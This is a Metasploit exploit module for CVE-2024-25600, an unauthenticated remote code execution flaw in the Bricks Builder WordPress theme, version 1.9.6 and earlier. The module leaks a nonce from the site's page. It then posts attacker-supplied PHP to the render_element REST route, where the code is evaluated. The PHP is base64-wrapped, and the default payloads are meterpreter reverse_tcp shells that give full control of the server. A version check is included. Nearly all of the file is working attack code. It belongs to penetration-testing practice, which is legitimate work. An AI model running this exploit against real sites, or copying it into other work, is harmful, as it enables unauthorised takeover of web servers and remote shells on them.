##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Unauthenticated RCE in Bricks Builder Theme',
        'Description' => %q{
          This module exploits an unauthenticated remote code execution vulnerability in the
          Bricks Builder Theme versions <= 1.9.6 for WordPress. The vulnerability allows attackers
          to execute arbitrary PHP code by leveraging a nonce leakage to bypass authentication and
          exploit the eval() function usage within the theme. Successful exploitation allows for full
          control of the affected WordPress site. It is recommended to upgrade to version 1.9.6.1 or higher.
        },
        'Author' => [
          'Calvin Alkan', # Vulnerability discovery
          'Valentin Lobstein' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-25600'],
          ['URL', 'https://github.com/Chocapikk/CVE-2024-25600'],
          ['URL', 'https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6'],
          ['WPVDB', 'afea4f8c-4d45-4cc0-8eb7-6fa6748158bd']
        ],
        'DisclosureDate' => '2024-02-19',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        },
        'Platform' => ['unix', 'linux', 'win', 'php'],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [
          [
            'PHP In-Memory',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' },
              'Type' => :php_memory
            }
          ],
          [
            'Unix In-Memory',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp' },
              'Type' => :unix_memory
            }
          ],
          [
            'Windows In-Memory',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse_tcp' },
              'Type' => :win_memory
            }
          ],
        ],
        'Privileged' => false
      )
    )
  end

  def fetch_nonce
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi('method' => 'GET', 'uri' => uri)
    return nil unless res&.code == 200

    script_tag_match = res.body.match(%r{<script id="bricks-scripts-js-extra"[^>]*>([\s\S]*?)</script>})
    return nil unless script_tag_match

    script_content = script_tag_match[1]
    nonce_match = script_content.match(/"nonce":"([a-f0-9]+)"/)
    nonce_match ? nonce_match[1] : nil
  end

  def exploit
    nonce = fetch_nonce
    fail_with(Failure::NoAccess, 'Failed to retrieve nonce. Exiting...') unless nonce

    print_good("Nonce retrieved: #{nonce}")

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'ctype' => 'application/json',
      'data' => {
        'postId' => rand(1..10000).to_s,
        'nonce' => nonce,
        'element' => {
          'name' => 'code',
          'settings' => {
            'executeCode' => 'true',
            'code' => "<?php #{payload_instance.arch.include?(ARCH_PHP) ? payload.encoded : "system(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}'))"} ?>"
          }
        }
      }.to_json,
      'vars_get' => {
        'rest_route' => '/bricks/v1/render_element'
      }
    )
  end

  def check
    return CheckCode::Unknown('WordPress does not appear to be online.') unless wordpress_and_online?

    wp_version = wordpress_version
    print_status("WordPress Version: #{wp_version}") if wp_version

    theme_check_code = check_theme_version_from_style('bricks', '1.9.6.1')
    return CheckCode::Unknown('The Bricks Builder theme does not appear to be installed') unless theme_check_code
    return CheckCode::Detected('The Bricks Builder theme is running but the version was unable to be determined') if theme_check_code.code == 'detected'
    return CheckCode::Safe("The Bricks Builder is running version: #{theme_check_code.details[:version]}, which is not vulnerable.") unless theme_check_code.code == 'appears'

    theme_version = theme_check_code.details[:version]
    print_good("Detected Bricks Builder theme version: #{theme_version}")
    CheckCode::Appears
  end

end
